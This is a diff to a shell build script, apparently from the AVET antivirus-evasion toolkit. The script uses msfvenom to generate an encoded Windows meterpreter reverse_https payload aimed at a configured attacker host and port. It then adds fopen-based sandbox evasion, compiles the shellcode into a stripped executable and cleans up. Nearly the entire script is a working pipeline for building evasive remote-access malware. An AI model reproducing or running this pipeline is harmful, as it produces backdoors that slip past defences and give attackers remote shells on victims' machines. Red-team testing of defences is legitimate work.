@@ -6,6 +6,9 @@
 # or enter $win32_compiler="mycompiler" here
 . build/global_win32.sh
 
+# import feature construction interface
+. build/feature_construction.sh
+
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
@@ -14,11 +17,27 @@ LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
 # generate payload and call avet
-msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
-./make_avet -f sc.txt -F
+msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
+
+# add fopen sandbox evasion
+add_evasion fopen_sandbox_evasion
+
+# set shellcode source
+set_shellcode_source static_from_file input/sc_c.txt
+
+# set decoder and key source
+set_decoder none
+set_key_source none
+
+# set shellcode binding technique
+set_shellcode_binding exec_shellcode
+
+# enable debug output
+enable_debug_print
 
 # compile
-$win32_compiler -o pwn.exe avet.c
+$win32_compiler -o output/output.exe source/avet.c
+strip output/output.exe
 
 # cleanup
-rm sc.txt && echo "" > defs.h
+cleanup_techniques
